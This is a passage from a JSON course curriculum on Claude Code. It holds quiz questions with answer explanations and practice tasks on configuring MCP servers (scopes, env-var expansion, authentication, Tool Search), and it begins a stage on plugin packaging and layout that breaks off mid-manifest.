    "options": [
     "Edit `~/.claude.json` directly and move the entry to `.mcp.json`.",
     "Run `claude mcp add --scope project my-docs-server -- npx my-docs` — the new scope overwrites the old one.",
     "Run `claude mcp remove my-docs-server --scope user`, then re-add with `--scope project`.",
     "Run `claude mcp add --scope project my-docs-server` — omitting the command copies it from the existing entry."
    ],
    "correct": 2,
    "sectionIndices": [
     2
    ],
    "explanation": "Scope is fixed at add time. To change it you must remove the entry at its current scope (`--scope user`) and then re-add it with the desired scope (`--scope project`)."
   },
   {
    "prompt": "Your `.mcp.json` defines a server named `search` pointing to an internal URL. A teammate also has a local entry named `search` pointing to their personal search server. Which server runs when they use Claude Code?",
    "options": [
     "The project `.mcp.json` entry — project scope overrides local scope.",
     "The local entry in `~/.claude.json` — local scope has higher precedence than project scope.",
     "Both run simultaneously and Claude picks the one that responds first.",
     "Claude merges both entries, taking the URL from local and the headers from project."
    ],
    "correct": 1,
    "sectionIndices": [
     3
    ],
    "explanation": "The precedence order is local > project > user. When the same server name exists in multiple scopes, only the highest-precedence entry is used in its entirety — no field merging occurs."
   },
   {
    "prompt": "You run `claude mcp add --scope project db-tool --env DB_PORT=5432 db-mcp -- node server.js --port 5432`. The server fails to connect. Checking `claude mcp get db-tool` you see the launch command looks wrong. What is the likely cause?",
    "options": [
     "The `--env` flag cannot be used with `--scope project`; env vars must go in `.mcp.json`.",
     "The `--` separator was placed before `--env`, causing Claude to parse `DB_PORT=5432` as a server arg, not an env var.",
     "Without `--` before the server command (`node server.js`), Claude parses `--port 5432` as one of its own options instead of passing it to the server.",
     "The `--scope` flag must come after the server name, not before it."
    ],
    "correct": 2,
    "sectionIndices": [
     4
    ],
    "explanation": "The `--` separator is required for stdio servers: everything after it is passed untouched to the launch command. Without it, Claude parses the server's own flags (like `--port`) as Claude Code options, corrupting the launch command."
   },
   {
    "prompt": "You add an HTTP MCP server with `claude mcp add --transport http my-api https://mcp.example.com`. `claude mcp list` shows it as `✓ Connected`. You edit `.mcp.json` to add an env var, then immediately use the server. The edit has no effect. Why?",
    "options": [
     "HTTP servers ignore `.mcp.json`; their config must be set with `--env` at add time.",
     "Claude Code reads `.mcp.json` only at session start, so mid-session edits have no effect until you restart.",
     "Env vars are not supported for HTTP transport; they only apply to stdio servers.",
     "You must run `claude mcp remove` and re-add the server for any config change to take effect."
    ],
    "correct": 1,
    "sectionIndices": [
     1,
     5
    ],
    "explanation": "Claude Code reads `.mcp.json` only at session start. Changes to the file (even saved to disk) are not picked up mid-session — you must restart Claude Code for the edits to take effect."
   },
   {
    "prompt": "Your team's `.mcp.json` contains `\"apiKey\": \"${INTERNAL_API_KEY}\"` in the server's `env` block. A security reviewer asks whether the literal token ends up in git history. What is the accurate answer?",
    "options": [
     "Yes — Claude Code expands the variable at session start, but the unexpanded `${INTERNAL_API_KEY}` string is what gets committed to VCS.",
     "No — Claude Code substitutes env vars at runtime; only the `${INTERNAL_API_KEY}` placeholder is stored in `.mcp.json` and committed.",
     "It depends on transport: HTTP servers expand vars into the URL before writing, but stdio servers keep the placeholder.",
     "Env var expansion only works in `headers`, not in the `env` block, so the literal value would be committed."
    ],
    "correct": 1,
    "sectionIndices": [
     1
    ],
    "explanation": "Env var expansion (`${VAR}` and `${VAR:-default}`) happens at runtime, not at write time. Only the placeholder string is stored in `.mcp.json` and committed, keeping secrets out of VCS."
   },
   {
    "prompt": "An HTTP MCP server returns a 401 on first connection. What does Claude Code do, and what can the team admin do to authenticate it non-interactively in CI?",
    "options": [
     "Claude retries the connection 3 times then marks it failed; for CI, set the token in `ANTHROPIC_API_KEY`.",
     "Claude marks the server as needing authentication; for CI use a static token via `--header \"Authorization: Bearer <token>\"` at add time.",
     "Claude falls back to OAuth automatically; for CI set `MCP_CLIENT_SECRET` in the environment.",
     "Claude disables the server permanently until `claude mcp reset-project-choices` is run; re-add with `--no-auth` for CI."
    ],
    "correct": 1,
    "sectionIndices": [
     6
    ],
    "explanation": "Claude Code marks a server as needing authentication on 401 or 403. For CI or non-interactive flows, a static Bearer token via `--header` is the correct approach. If `headers.Authorization` is set but rejected, Claude reports a failed connection rather than falling back to OAuth."
   },
   {
    "prompt": "You have a server whose OAuth scopes were discovered automatically, but your security team wants to restrict it to only `read:issues`. You add `\"oauth\": { \"scopes\": \"read:issues\" }` to the server's `.mcp.json` entry. Later a tool call fails with 403 `insufficient_scope`. What should you do?",
    "options": [
     "Remove the `oauth.scopes` field to let Claude Code re-discover all scopes automatically.",
     "Add `\"oauth\": { \"authServerMetadataUrl\": \"https://...\" }` — it overrides `scopes` and grants the needed access.",
     "Widen `oauth.scopes` to include the additional scope the failing tool requires (e.g. `\"read:issues write:comments\"`).",
     "Run `claude mcp logout <name>` and re-authenticate — the `insufficient_scope` error means the token is expired."
    ],
    "correct": 2,
    "sectionIndices": [
     6
    ],
    "explanation": "`oauth.scopes` pins requested scopes and overrides discovered scopes. A 403 `insufficient_scope` means the pinned scope set is too narrow for that tool call — widen it to include the required scope."
   },
   {
    "prompt": "Your team installs 12 MCP servers. A developer complains that Claude Code's context window is being consumed by all those tool definitions at startup. You check and `ENABLE_TOOL_SEARCH` is not set. What is actually happening?",
    "options": [
     "All 12 servers' tool definitions are loaded upfront — unset `ENABLE_TOOL_SEARCH` means the feature is disabled.",
     "Tool Search is enabled by default: only tool names and server instructions load at session start; full definitions are deferred and fetched on demand.",
     "All tool definitions load upfront only for stdio servers; HTTP servers always defer.",
     "The context budget consumed equals 12 × 2KB (the per-tool truncation limit), so it is bounded but not zero."
    ],
    "correct": 1,
    "sectionIndices": [
     7
    ],
    "explanation": "Tool Search is enabled by default (when `ENABLE_TOOL_SEARCH` is unset). Tool definitions are deferred — only names and server instructions load at session start. Adding more servers under default deferral has minimal context impact."
   },
   {
    "prompt": "You have one MCP tool that must be available on every turn (e.g. a memory-lookup tool). Tool Search is enabled globally. How do you ensure this tool's definition is always loaded upfront without disabling Tool Search for all servers?",
    "options": [
     "Set `ENABLE_TOOL_SEARCH=false` in the server's env block — it applies per-server.",
     "Add `\"alwaysLoad\": true` to that server's entry in `.mcp.json` (v2.1.121+) — it loads all that server's tools upfront regardless of `ENABLE_TOOL_SEARCH`.",
     "Use `--transport sse` for that server — SSE transport always loads tools upfront.",
     "Add the tool name to `permissions.allow` — allowed tools are pre-loaded."
    ],
    "correct": 1,
    "sectionIndices": [
     7
    ],
    "explanation": "`alwaysLoad: true` on a server config (v2.1.121+) loads all that server's tools upfront regardless of the global `ENABLE_TOOL_SEARCH` setting. This lets you keep deferral for other servers while guaranteeing availability for critical tools."
   },
   {
    "prompt": "A stdio MCP server crashes mid-session. The developer waits for it to reconnect automatically but it never does. Why?",
    "options": [
     "Stdio servers auto-reconnect up to 5 attempts, but only if `MCP_TIMEOUT` is set.",
     "Stdio servers do not auto-reconnect. The developer must manually reconnect via the `/mcp` panel.",
     "Stdio auto-reconnect requires `\"reconnect\": true` in `.mcp.json`; it is not on by default.",
     "Auto-reconnect is only for auth failures; crashes require a new session."
    ],
    "correct": 1,
    "sectionIndices": [
     8
    ],
    "explanation": "HTTP/SSE servers auto-reconnect mid-session with exponential backoff (up to 5 attempts). Stdio servers do NOT auto-reconnect — a crashed stdio server requires manual reconnection via the `/mcp` panel or restarting the session."
   },
   {
    "prompt": "A team is using Claude Code with an `ANTHROPIC_API_KEY` set. The IT admin added a connector at `claude.ai/customize/connectors` for the team. Developers report the connector never appears in Claude Code sessions. What is the cause?",
    "options": [
     "claude.ai connectors only appear on macOS; the team is on Linux.",
     "claude.ai connectors load only when active auth is the Claude.ai subscription. With `ANTHROPIC_API_KEY` active, they silently do not load.",
     "The connector must also be added locally with `claude mcp add --scope user` for it to appear in the CLI.",
     "Enterprise connectors require `ENABLE_CLAUDEAI_MCP_SERVERS=true` to be set explicitly."
    ],
    "correct": 1,
    "sectionIndices": [
     9
    ],
    "explanation": "claude.ai connectors silently do not load when `ANTHROPIC_API_KEY`, `ANTHROPIC_AUTH_TOKEN`, `apiKeyHelper`, Bedrock, or Vertex is active as the auth source — even after `/login`. They only appear when the active auth is the Claude.ai subscription. Run `/status` to check."
   },
   {
    "prompt": "Your `headersHelper` script in `.mcp.json` fetches a short-lived Kerberos token and writes it to stdout. The server intermittently fails to connect because the script takes 15 seconds on a cold start. What should you change?",
    "options": [
     "Switch to OAuth — `headersHelper` has a hard 10-second timeout that cannot be changed, so long-running scripts must use OAuth instead.",
     "Set `MCP_TIMEOUT` to a higher value — this extends the `headersHelper` script's execution budget.",
     "Cache the token to disk inside the script and return early if it is still valid — `headersHelper` runs fresh each connect with no caching.",
     "Use `--header` with a static token instead — `headersHelper` is only for HTTP transport and the server may be stdio."
    ],
    "correct": 0,
    "sectionIndices": [
     6
    ],
    "explanation": "`headersHelper` has a hard 10-second timeout; scripts exceeding it cause connection failure. If your token-generation script reliably takes longer than 10 seconds, `headersHelper` is the wrong tool — use OAuth or pre-generate and cache the token in the environment before starting Claude Code."
   }
  ],
  "tasks": [
   {
    "id": "stage-5-task-add-project-server",
    "afterSectionIdx": 1,
    "title": "Add a project-scoped MCP server and inspect .mcp.json",
    "instructions": "This task gets you comfortable with the project-scope workflow — the recommended approach for team consistency.\n\n1. In a scratch git repo (or any existing project), add the public filesystem MCP server at project scope:\n```bash\ncd ~/projects/my-scratch-repo   # or any project dir\nclaude mcp add --scope project filesystem -- npx -y @modelcontextprotocol/server-filesystem /tmp\n```\n\n2. Inspect the generated file:\n```bash\ncat .mcp.json\n```\nYou should see a `mcpServers` block with your server's `type`, `command`, and `args`.\n\n3. Verify Claude Code recognizes it:\n```bash\nclaude mcp list\n```\nYour `filesystem` entry should appear. Note the status — it may show `⏸ Pending approval` until you accept the workspace-trust dialog.\n\n4. Clean up:\n```bash\nclaude mcp remove filesystem --scope project\n```",
    "doneWhen": "`cat .mcp.json` shows the `filesystem` server entry and `claude mcp list` shows it as present (any status)."
   },
   {
    "id": "stage-5-task-env-var-secret",
    "afterSectionIdx": 5,
    "title": "Add a server with a secret via env var expansion",
    "instructions": "Practice keeping secrets out of `.mcp.json` using `${VAR}` expansion.\n\n1. Export a fake token in your shell:\n```bash\nexport MY_MCP_TOKEN=fake-token-abc123\n```\n\n2. Add an HTTP MCP server that references it:\n```bash\nclaude mcp add --scope project --transport http secret-demo https://httpbin.org/anything --header \"Authorization: Bearer ${MY_MCP_TOKEN}\"\n```\n\n3. Open `.mcp.json` and confirm the file contains the literal string `${MY_MCP_TOKEN}` (the placeholder), NOT the expanded token value `fake-token-abc123`:\n```bash\ngrep -n 'MY_MCP_TOKEN\\|fake-token' .mcp.json\n```\nYou should see `MY_MCP_TOKEN` and NOT `fake-token-abc123`.\n\n4. Clean up:\n```bash\nclaude mcp remove secret-demo --scope project\n```",
    "doneWhen": "`grep 'MY_MCP_TOKEN' .mcp.json` returns a match and `grep 'fake-token' .mcp.json` returns no match, confirming only the placeholder is stored."
   },
   {
    "id": "stage-5-task-tool-search-alwaysload",
    "afterSectionIdx": 7,
    "title": "Observe Tool Search deferral and force-load a specific server",
    "instructions": "Confirm the default deferral behavior and practice overriding it for a critical server.\n\n1. Add a project-scoped server (use the filesystem server from the earlier task):\n```bash\nclaude mcp add --scope project filesystem -- npx -y @modelcontextprotocol/server-filesystem /tmp\n```\n\n2. Open `.mcp.json` in a text editor and add `\"alwaysLoad\": true` to the server entry so it looks like:\n```json\n{\n  \"mcpServers\": {\n    \"filesystem\": {\n      \"type\": \"stdio\",\n      \"command\": \"npx\",\n      \"args\": [\"-y\", \"@modelcontextprotocol/server-filesystem\", \"/tmp\"],\n      \"alwaysLoad\": true\n    }\n  }\n}\n```\n\n3. Start a new Claude Code session and immediately (before any prompt) run:\n```\n/mcp\n```\nVerify the `filesystem` server shows as connected. With `alwaysLoad: true` it connects at startup rather than waiting for a tool search.\n\n4. In the same session, also run:\n```\n/status\n```\nNote the active auth type — this matters for whether claude.ai connectors load (they don't with API key auth).\n\n5. Clean up when done:\n```bash\nclaude mcp remove filesystem --scope project\n```",
    "doneWhen": "`.mcp.json` contains `\"alwaysLoad\": true` and after starting a new Claude Code session `/mcp` shows the filesystem server as connected at startup."
   }
  ],
  "visualizations": [
   {
    "id": "stage-5-v",
    "kind": "comparison-table",
    "title": "MCP (connecting tools)",
    "textualSummary": "Key concepts of MCP (connecting tools): MCP server, MCP scope (local / project / user), Configuration-as-code distribution.",
    "columns": [
     "Concept",
     "In this stage"
    ],
    "rows": [
     {
      "label": "MCP server",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     },
     {
      "label": "MCP scope (local / project / user)",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     },
     {
      "label": "Configuration-as-code distribution",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     },
     {
      "label": "Scope precedence (non-merging)",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     }
    ]
   }
  ],
  "confusions": [
   {
    "misconception": "Skipping MCP (connecting tools).",
    "correction": "Each stage is load-bearing for the setup."
   },
   {
    "misconception": "These concepts are interchangeable.",
    "correction": "Each has a distinct role; see the definitions."
   }
  ],
  "quiz": [
   {
    "id": "stage-5-q1",
    "type": "multiple-choice",
    "prompt": "A teammate runs `claude mcp add --scope project github -- npx -y @github/mcp-server` and gets the 'Added' confirmation message. She then tries to use a GitHub tool immediately and nothing happens. What is the most likely explanation?",
    "options": [
     "The `--scope project` flag requires admin approval before the server activates.",
     "'Added' only means the entry was saved; the server may not have connected yet — she should verify with `claude mcp list`.",
     "The `--` separator was used incorrectly and the server was added with a bad command.",
     "Project-scoped servers require a session restart before they appear in `claude mcp list`."
    ],
    "correct": 1,
    "explanation": "The content states: 'The `Added` confirmation only means the entry was saved, not that the server starts/connects — always verify with `claude mcp list`.' Option A is wrong because there is no admin-approval gate on individual `claude mcp add` commands (approval prompts appear on clone/first connect for project-scoped servers). Option C is wrong because `--` is the correct separator for stdio servers. Option D is wrong because `claude mcp list` shows server status within the current session."
   },
   {
    "id": "stage-5-q2",
    "type": "multiple-choice",
    "prompt": "Your team has a shared internal MCP server that requires Kerberos tickets, which are short-lived and environment-specific. You need every developer who opens the project to have auth headers automatically generated at connection time. Which mechanism is designed for this case?",
    "options": [
     "Store the Kerberos token in `.mcp.json` using `${MY_TOKEN}` env var expansion.",
     "Use `--header \"Authorization: Bearer <token>\"` in the `claude mcp add` command.",
     "Configure `headersHelper` in `.mcp.json` with a shell command that generates the auth headers at connection time.",
     "Use `oauth.scopes` pinning in `.mcp.json` to restrict to a Kerberos-compatible scope."
    ],
    "correct": 2,
    "explanation": "`headersHelper` is explicitly described as the solution for non-OAuth auth (Kerberos, short-lived tokens, internal SSO): it 'runs a shell command at connection time to generate auth headers.' Option A fails because env var expansion embeds a static value — it cannot generate time-limited tokens dynamically. Option B sets a static token baked in at `mcp add` time, not regenerated per-connection. Option D is wrong because `oauth.scopes` is for restricting OAuth scope sets, not for Kerberos auth at all."
   },
   {
    "id": "stage-5-q3",
    "type": "multiple-choice",
    "prompt": "A developer adds a project-scoped MCP server to `.mcp.json` and also has a user-scoped server with the same name in `~/.claude.json`. When Claude Code starts, which server entry is used?",
    "options": [
     "Both entries are merged — fields from user scope fill in any gaps the project entry leaves blank.",
     "The user-scoped entry, because user settings are more persistent than project settings.",
     "The project-scoped entry, because project scope has higher precedence than user scope.",
     "Whichever entry was added most recently wins."
    ],
    "correct": 2,
    "explanation": "The precedence table shows local (rank 1) > project (rank 2) > user (rank 3). The content explicitly states: 'When a server is defined in multiple places, only the entire entry from the highest-precedence source is used — fields are never merged.' So the project entry (rank 2) beats the user entry (rank 3). Option A is wrong because merging never happens. Option B inverts the precedence order. Option D is wrong — recency has no role in precedence."
   },
   {
    "id": "stage-5-q4",
    "type": "multiple-choice",
    "prompt": "You run `claude mcp add --transport ws my-realtime-server wss://example.com/mcp` and get an error saying `ws` is not a valid transport. What is the correct way to add a WebSocket MCP server?",
    "options": [
     "Use `--transport websocket` instead of `--transport ws`.",
     "Add it via `.mcp.json` or `claude mcp add-json` with `type: \"ws\"`; `--transport` does not accept `ws`.",
     "WebSocket servers are not supported; use SSE instead.",
     "Use `--transport sse` since SSE and WebSocket are interchangeable in the CLI."
    ],
    "correct": 1,
    "explanation": "The content states: 'WebSocket: add only via `.mcp.json` or `add-json` with `type:\"ws\"`; `--transport` does **not** accept `ws`.' Option A is wrong — neither `ws` nor `websocket` works as a `--transport` flag value. Option C is wrong because WebSocket is supported, just not via `--transport`. Option D is wrong and doubly so because SSE is deprecated."
   },
   {
    "id": "stage-5-q5",
    "type": "multiple-choice",
    "prompt": "A teammate edited `.mcp.json` to add a new server while their Claude Code session was already running. They notice the new server does not appear in `/mcp`. What should they do?",
    "options": [
     "Run `claude mcp reset-project-choices` to reload all project-scoped servers.",
     "Restart the Claude Code session — it reads config files only at session start.",
     "Run `/reload-plugins` to pick up changes to `.mcp.json`.",
     "Run `claude mcp get <name>` to trigger a re-read of the config file."
    ],
    "correct": 1,
    "explanation": "The content states: 'Claude Code reads it **only at session start** — restart after editing.' Option A (`reset-project-choices`) resets approval decisions for already-known project servers, it does not reload the config. Option C (`/reload-plugins`) connects/disconnects plugin-bundled servers, not changes to `.mcp.json`. Option D (`mcp get`) only reads from already-loaded state, not from disk."
   },
   {
    "id": "stage-5-q6",
    "type": "multiple-choice",
    "prompt": "Your team connects a Claude.ai connector via the admin dashboard. A developer whose Claude Code uses `ANTHROPIC_API_KEY` for auth runs `/status` and notices the connector is absent. Why?",
    "options": [
     "The developer needs to run `claude mcp login` to authenticate the connector manually.",
     "Claude.ai connectors only load when active auth is the Claude.ai subscription — they silently do not load when `ANTHROPIC_API_KEY` is active.",
     "The connector is pending approval at project scope and shows `⏸ Pending approval` in `claude mcp list`.",
     "The developer must run `/reload-plugins` to pull down connectors added after their session started."
    ],
    "correct": 1,
    "explanation": "The content states: 'They silently do **not** load when `ANTHROPIC_API_KEY`, `ANTHROPIC_AUTH_TOKEN`, `apiKeyHelper`, Bedrock, or Vertex is active (even after `/login`).' This is a key gotcha: API key auth and Claude.ai subscription auth are mutually exclusive for connector loading. Option A is wrong because `mcp login` is for OAuth on regular MCP servers, not for claude.ai connectors. Option C is wrong — the approval flow is for project-scoped `.mcp.json` servers, not connectors. Option D is wrong because `/reload-plugins` is for plugin-bundled servers."
   },
   {
    "id": "stage-5-q7",
    "type": "multiple-choice",
    "prompt": "You run `claude mcp add --env MY_SECRET=abc my-server -- python server.py` but the server immediately fails with an env parsing error. A colleague suggests the `--env` flag may have consumed the server name. What went wrong and how do you fix it?",
    "options": [
     "The server name `my-server` must come before `--env`; reorder to `claude mcp add my-server --env MY_SECRET=abc -- python server.py`.",
     "The `--env` flag does not support `=`; use `--env MY_SECRET abc` instead.",
     "The `--env` flag requires the secret to be in single quotes: `--env 'MY_SECRET=abc'`.",
     "The `--` separator must come immediately after `claude mcp add` before any flags."
    ],
    "correct": 0,
    "explanation": "The content warns: 'Don't put the server name directly after `--env` — it's read as another `KEY=value` and rejected; place another option between them.' In the broken command, `--env MY_SECRET=abc my-server` causes `my-server` to be parsed as another env var attempt. The fix is to put the server name before `--env`. Option B is wrong — `KEY=value` is the correct form. Option C is wrong — quoting doesn't fix the positional parsing problem. Option D is wrong — `--` must come after Claude's own options, not at the start."
   },
   {
    "id": "stage-5-q8",
    "type": "multi-select",
    "prompt": "Your security team requires that all MCP servers the team uses are pre-approved and that no developer should be able to casually connect arbitrary third-party servers. Which of the following are valid mechanisms the content describes for achieving this? (Select all that apply.)",
    "options": [
     "Distribute approved servers via a managed plugin marketplace so everyone gets the same tools automatically when the plugin is enabled.",
     "Share an approved catalog as an internal wiki listing exact `claude mcp add` commands.",
     "Set `ANTHROPIC_API_KEY` in the project environment, which blocks unapproved server connections.",
     "Commit `.mcp.json` to version control so teammates get the same servers with an approval prompt before first connect.",
     "Enable `disableClaudeAiConnectors: true` in project settings to block all claude.ai connectors for the repo."
    ],
    "correct": [
     0,
     1,
     3,
     4
    ],
    "explanation": "Options A and D are both described as team distribution mechanisms: plugins give 'zero-touch consistency' and `.mcp.json` in VCS gives 'everyone who clones gets the same servers (with an approval prompt before first connect).' Option B is also described: 'Since there is no built-in MCP registry, share an approved catalog as a plugin marketplace or an internal wiki listing exact `claude mcp add` commands.' Option E is valid for blocking claude.ai connectors: 'Opt a repo out by committing `disableClaudeAiConnectors:true` in project settings.' Option C is wrong — `ANTHROPIC_API_KEY` controls auth mode, not server connection permissions; the content does not describe it as a security gate for MCP servers."
   },
   {
    "id": "stage-5-q9",
    "type": "multi-select",
    "prompt": "A slow stdio MCP server is timing out at startup. Which of the following are correct statements about MCP timeout behavior based on the content? (Select all that apply.)",
    "options": [
     "The default startup timeout is 30 seconds; override with the `MCP_TIMEOUT` environment variable (value in milliseconds).",
     "Per-server tool-execution timeout can be set via a `timeout` field in the server's `.mcp.json` entry.",
     "HTTP and SSE servers auto-reconnect with exponential backoff on mid-session disconnection; stdio servers do NOT auto-reconnect.",
     "Values below 1000 for the per-server `timeout` field are honored and override `MCP_TOOL_TIMEOUT`.",
     "Slow stdio startup is best fixed by switching the server to HTTP transport, which has no startup timeout."
    ],
    "correct": [
     0,
     1,
     2
    ],
    "explanation": "Options A, B, and C are all directly stated. A: 'Startup timeout: default 30s; override with `MCP_TIMEOUT` (ms).' B: '`timeout` field (ms) in the server's `.mcp.json` entry overrides `MCP_TOOL_TIMEOUT`.' C: 'HTTP/SSE auto-reconnect mid-session... Stdio servers do NOT auto-reconnect.' Option D is wrong: 'values < 1000 are ignored (fall through to `MCP_TOOL_TIMEOUT`, default ~28h).' Option E is wrong — the content recommends bumping `MCP_TIMEOUT` for slow stdio servers, not switching transports, and does not claim HTTP has no startup timeout."
   },
   {
    "id": "stage-5-q10",
    "type": "multiple-choice",
    "prompt": "Tool Search is enabled by default. A developer adds 15 new MCP servers and worries the context window will be overwhelmed. Under default Tool Search behavior, what actually happens?",
    "options": [
     "All tools from all 15 servers load upfront, consuming context proportional to the number of tools.",
     "Tool definitions are deferred — only tool names and server instructions load at session start — so adding servers has minimal context impact.",
     "Claude Code automatically removes the oldest servers to stay within the context budget.",
     "Tool Search caps the number of servers at 10; the 11th through 15th servers are ignored."
    ],
    "correct": 1,
    "explanation": "The content states: 'Tool Search is **enabled by default**: tool definitions are deferred (only tool **names + server instructions** load at session start) and discovered on demand... Adding more servers under default deferral has minimal context impact.' Option A describes behavior only when `ENABLE_TOOL_SEARCH=false`. Option C is invented — there is no automatic server eviction. Option D is invented — there is no server count cap."
   },
   {
    "id": "stage-5-q11",
    "type": "multiple-choice",
    "prompt": "A team wants a specific MCP server to always have its tools available immediately, even on the first tool call of a session, without waiting for Tool Search to discover them. What is the correct configuration?",
    "options": [
     "Set `ENABLE_TOOL_SEARCH=false` in the project environment to load all server tools upfront.",
     "Set `alwaysLoad: true` on the server's config entry in `.mcp.json`.",
     "Use `--transport sse` for the server, since SSE servers load tools upfront.",
     "Add the server with `--scope user` so it loads before project-scoped servers."
    ],
    "correct": 1,
    "explanation": "The content states: '`alwaysLoad: true` on a server config (v2.1.121+, all server types) loads all its tools upfront regardless of `ENABLE_TOOL_SEARCH`. Reserve it for tools needed every turn.' Option A would load ALL servers upfront, defeating deferred loading for everything else — `alwaysLoad` is the targeted, per-server solution. Option C is wrong — transport type does not affect whether tools are deferred. Option D is wrong — scope affects sharing, not tool loading behavior."
   },
   {
    "id": "stage-5-q12",
    "type": "multiple-choice",
    "prompt": "An MCP server with a static `Authorization: Bearer <token>` header in its config returns a 401. Claude Code marks it as having a failed connection rather than prompting for OAuth login. Why?",
    "options": [
     "Static token auth requires the `--no-browser` flag to avoid an OAuth fallback loop.",
     "If `headers.Authorization` is set but rejected, Claude reports a failed connection rather than falling back to OAuth — the token must be valid or remove the header.",
     "A 401 on a token-auth server triggers the `/mcp` panel to prompt for re-authentication via OAuth.",
     "The server must be re-added with `--transport sse` to enable the 401→OAuth fallback path."
    ],
    "correct": 1,
    "explanation": "The content explicitly states: 'If `headers.Authorization` is set but rejected, Claude reports a **failed connection** rather than falling back to OAuth — the token must be valid or remove the header.' The presence of a static auth header tells Claude Code the server does not use OAuth, so a 401 is treated as a configuration failure, not an authentication challenge to resolve via OAuth. Option A inverts the logic (`--no-browser` is for SSH SSH scenarios). Option C contradicts the content. Option D is wrong — transport type does not determine the 401 handling."
   },
   {
    "id": "stage-5-q13",
    "type": "multiple-choice",
    "prompt": "A developer wants a personal docs-search MCP server available in every project they work on, without adding it to any project's `.mcp.json`. Which scope should they use?",
    "options": [
     "`--scope local`, because local scope persists across sessions for the current machine.",
     "`--scope project`, because project-scoped servers are shared via VCS automatically.",
     "`--scope user`, because user scope makes the server available across all projects.",
     "`--scope global` (the new alias for the cross-project scope introduced in recent versions)."
    ],
    "correct": 2,
    "explanation": "The content states: 'Use `--scope user` for personal servers wanted in every project (e.g. a docs-search server).' User scope writes to `~/.claude.json` under top-level `mcpServers`, making it available 'in all your projects.' Option A is wrong — local scope is private to the current project only. Option B is wrong — project scope is tied to one project's `.mcp.json` and shared via VCS (not personal). Option D is wrong — the content notes that older versions called user scope 'global' but the current flag is `--scope user`; `global` is not described as a current valid alias."
   },
   {
    "id": "stage-5-q14",
    "type": "multiple-choice",
    "prompt": "Your organization's security team sets `disableClaudeAiConnectors: true` in a managed policy (user-level settings). A developer then sets `disableClaudeAiConnectors: false` in their project settings to re-enable connectors for their repo. What happens?",
    "options": [
     "The project `false` overrides the user policy, and connectors load for that project.",
     "The most recently written setting wins, so the project `false` takes effect.",
     "A `true` anywhere wins — the project `false` cannot re-enable what user/policy `true` has disabled.",
     "The behavior is undefined; the two conflicting settings cause an error at session start."
    ],
    "correct": 2,
    "explanation": "The content states: 'any-source-true: a `true` anywhere wins; a project `false` cannot re-enable a user/policy `true`.' This is a one-way ratchet: once any scope sets `true`, it cannot be overridden downward by lower-precedence scopes. Option A inverts the rule. Option B inverts the rule and incorrectly applies a recency model. Option D is wrong — the content describes well-defined behavior, not an error."
   }
  ],
  "masteryCheckpoint": "You can explain the concepts of MCP (connecting tools)."
 },
 {
  "id": "stage-6",
  "stage": 6,
  "title": "Plugins & distribution",
  "summary": "Plugins & distribution: plugin, marketplace, settings scope.",
  "prerequisites": [
   "stage-5"
  ],
  "objectives": [
   "Understand the concepts in Plugins & distribution."
  ],
  "definitions": [
   {
    "term": "plugin",
    "short": "A self-contained directory that bundles shareable Claude Code components (skills, agents, hooks, MCP/LSP servers, monitors, bin executables) under one namespace."
   },
   {
    "term": "marketplace",
    "short": "A catalog of plugins, defined by a marketplace.json, that you first add (register the catalog) and then install individual plugins from."
   },
   {
    "term": "settings scope",
    "short": "The level (user, project, local, or managed) that determines which settings file a plugin's enabled state is written to and therefore who receives it."
   },
   {
    "term": "project-scope distribution via VCS",
    "short": "Sharing plugins with a whole team by committing the marketplace registration and enabled-plugins state into the repo's checked-in project settings."
   },
   {
    "term": "managed (admin) settings",
    "short": "Admin-installed, read-only settings that enforce plugin and marketplace configuration which users cannot modify or remove."
   },
   {
    "term": "plugin authoring layout",
    "short": "The required directory structure where only plugin.json lives in `.claude-plugin/` and all component dirs sit at the plugin root, with the manifest name acting as the component namespace."
   }
  ],
  "sections": [
   {
    "heading": "Why Plugins Exist: The Packaging Problem",
    "body": "Standalone configuration in `.claude/` solves a single-project problem. As soon as you want the same code-review skill, the same linting hook, and the same internal MCP server in every repository your team touches, you have a distribution problem: copying files across repos creates stale forks, updating them is manual, and there is no canonical version.\n\nPlugins solve this. A plugin is a **self-contained directory** that bundles any number of Claude Code components — skills, agents, hooks, MCP servers, LSP servers, monitors, executables — under one namespace and one version, installable from a central catalog. The practical difference:\n\n| | Standalone `.claude/` | Plugin |\n|---|---|---|\n| Skill invocation | `/deploy` | `/my-plugin:deploy` |\n| Scope | One project | User, project, or local |\n| Updates | Manual copy | `/plugin update` or auto |\n| Distribution | Share files | Share marketplace URL |\n| Component isolation | Shared namespace | Per-plugin namespace prefix |\n| Version tracking | None | SemVer or git SHA |\n\nThe namespace prefix (`plugin-name:skill-name`) is not a limitation — it is the feature. Without it, two plugins that both define a `format` skill would silently conflict. The colon-separated form makes the origin unambiguous.\n\n**When to stay standalone:** personal workflows, project-specific one-offs, quick experiments before packaging. **When to use a plugin:** anything you want reproducible across machines or shared across your team."
   },
   {
    "heading": "Plugin Authoring Layout: The Only Rules That Matter",
    "body": "The critical structural rule is deceptively simple: **only `plugin.json` goes inside `.claude-plugin/`. Everything else goes at the plugin root.**\n\nThis is the complete canonical layout:\n\n```\nmy-plugin/\n├── .claude-plugin/\n│   └── plugin.json          # manifest — the only file that belongs here\n├── skills/\n│   ├── code-reviewer/\n│   │   └── SKILL.md\n│   └── pdf-processor/\n│       ├── SKILL.md\n│       └── scripts/\n├── commands/                # flat .md skills (legacy format; prefer skills/)\n│   └── status.md\n├── agents/\n│   ├── security-reviewer.md\n│   └── compliance-checker.md\n├── hooks/\n│   └── hooks.json\n├── bin/                     # executables added to Bash tool PATH\n│   └── my-cli-tool\n├── monitors/\n│   └── monitors.json\n├── output-styles/\n│   └── terse.md\n├── themes/\n│   └── dark.json\n├── .mcp.json                # MCP server configurations\n├── .lsp.json                # LSP server configurations\n└── settings.json            # plugin-default settings (agent + subagentStatusLine only)\n```\n\n### The manifest (`plugin.json`)\n\nThe manifest is optional — Claude Code auto-discovers components from the default locations if there is no manifest. Use it when you need metadata, custom component paths, version pinning, or `defaultEnabled: false`.\n\n```json\n{\n  \"$schema\": \"https://json.schemastore.org/claude-code-plugin-manifest.json\",\n  \"name\": \"my-plugin\",\n  \"displayName\": \"My 